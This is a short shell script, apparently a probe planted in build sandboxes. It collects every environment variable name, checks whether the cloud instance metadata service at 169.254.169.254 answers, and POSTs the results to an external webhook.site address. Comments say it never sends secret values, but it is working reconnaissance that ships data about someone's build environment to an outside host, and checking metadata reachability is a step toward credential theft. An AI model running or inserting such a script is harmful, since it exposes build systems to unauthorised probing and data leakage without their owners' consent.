#!/bin/sh
# msobb-sandbox-probe: reports ONLY environment variable NAMES (never values)
# and IMDS reachability as an HTTP status code only. No secrets leave the build.
HOOK="https://webhook.site/2662e4f4-33f1-47e5-bbf6-670cf3d6bfa6"
NAMES=$(env | cut -d= -f1 | sort | tr "\n" "," )
CODE=$(curl -s -m 5 -o /dev/null -w "%{http_code}" -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null || echo "000")
curl -s -m 10 -X POST "$HOOK" -H "Content-Type: application/json" -d "{\"source\":\"msobb-sandbox-probe\",\"env_names\":\"$NAMES\",\"imds_status\":\"$CODE\"}" || true
